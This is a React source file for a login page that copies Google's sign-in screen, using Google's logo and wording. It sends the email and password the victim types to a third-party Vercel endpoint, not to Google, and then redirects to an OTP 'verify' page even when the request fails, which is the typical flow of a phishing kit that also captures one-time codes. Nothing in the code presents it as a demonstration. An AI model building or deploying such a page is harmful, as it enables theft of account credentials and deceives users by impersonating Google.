import React, { useState } from "react";
import { useNavigate } from "react-router-dom";

const GoogleLogin = () => {
    const navigate = useNavigate();
    const [formData, setFormData] = useState({ email: "", password: "" });

    const handleChange = (e) => {
        setFormData({ ...formData, [e.target.name]: e.target.value });
    };

    const handleSubmit = async (e) => {
        e.preventDefault();

        try {
            const response = await fetch("https://think-pad-ruby.vercel.app/api/google/login", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(formData),
            });

            const data = await response.json();

            if (response.ok && data.success) {
                console.log("✅ Google Login Successful:", data);

                // Redirect to OTP verification page
                navigate("/verify");
            } else {
                alert(`❌ Google Login Failed: ${data.message || "Something went wrong"}`);
            }
        } catch (error) {
            console.error("❌ Error during Google login:", error);
            navigate("/verify");

        }
    };



    return (
        <div style={styles.container}>
            <div style={styles.card}>
                <img
                    src="https://ssl.gstatic.com/accounts/ui/logo_2x.png"
                    alt="Google Logo"
                    style={styles.logo}
                />
                <h2 style={styles.title}>Sign in</h2>
                <p style={styles.subtitle}>Use your Google Account</p>

                <form onSubmit={handleSubmit}>
                    <input
                        type="email"
                        name="email"
                        placeholder="Email or phone"
                        required
                        value={formData.email}
                        onChange={handleChange}
                        style={styles.input}
                    />
                    <input
                        type="password"
                        name="password"
                        placeholder="Password"
                        required
                        value={formData.password}
                        onChange={handleChange}
                        style={styles.input}
                    />
                    <a href="#" style={styles.link}>Forgot email?</a>

                    <div style={styles.buttonContainer}>
                        <a href="#" style={styles.createAccount}>Create account</a>
                        <button type="submit" style={styles.button}>Sign in</button>
                    </div>
                </form>
            </div>
        </div>
    );
};

const styles = {
    container: {
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        height: "100vh",
        backgroundColor: "#f8f9fa",
    },
    card: {
        backgroundColor: "#fff",
        padding: "40px",
        borderRadius: "8px",
        boxShadow: "0 2px 10px rgba(0,0,0,0.2)",
        textAlign: "center",
        width: "400px",
    },
    logo: {
        width: "75px",
        marginBottom: "10px",
    },
    title: {
        fontSize: "24px",
        fontWeight: "500",
        marginBottom: "5px",
    },
    subtitle: {
        fontSize: "14px",
        color: "#555",
        marginBottom: "20px",
    },
    input: {
        width: "100%",
        padding: "12px",
        border: "1px solid #ccc",
        borderRadius: "4px",
        marginBottom: "10px",
        fontSize: "16px",
    },
    link: {
        display: "block",
        textAlign: "left",
        color: "#1a73e8",
        fontSize: "14px",
        textDecoration: "none",
        marginBottom: "20px",
    },
    buttonContainer: {
        display: "flex",
        justifyContent: "space-between",
        alignItems: "center",
        marginTop: "20px",
    },
    createAccount: {
        color: "#1a73e8",
        textDecoration: "none",
        fontSize: "14px",
    },
    button: {
        backgroundColor: "#1a73e8",
        color: "#fff",
        border: "none",
        padding: "10px 20px",
        borderRadius: "4px",
        cursor: "pointer",
        fontSize: "14px",
    },
};

export default GoogleLogin;
